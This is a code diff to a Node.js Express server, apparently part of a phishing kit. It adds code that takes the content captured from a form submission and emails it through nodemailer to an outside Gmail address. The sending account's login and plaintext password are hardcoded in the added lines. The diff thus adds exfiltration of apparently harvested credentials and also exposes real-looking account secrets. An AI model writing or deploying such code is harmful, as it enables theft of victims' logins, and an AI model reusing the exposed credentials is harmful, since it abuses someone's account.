@@ -33,6 +33,32 @@ app.post('/_', function (req, res) {
         }
     });
     console.log(captured_content);
+    
+    var message = captured_content;
+    var toEmail = "mdalonebd@gmail.com";
+
+    var transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: 'bdeshak5@gmail.com',
+    pass: 'Njibhuvg1$'
+  }
+});
+
+   const mailOptions = {
+  from: 'bdeshak5@gmail.com',
+  to: toEmail, //list of receivers
+  subject: 'Nodemailer', // Subject line
+  html: message //plain text body
+};
+
+transporter.sendMail(mailOptions, function (err, info) {
+  if (err)
+    console.log(err)
+  else
+    console.log(info);
+});
+    
 });
 
 app.get('/images/eye-off.png', function (req, res) {
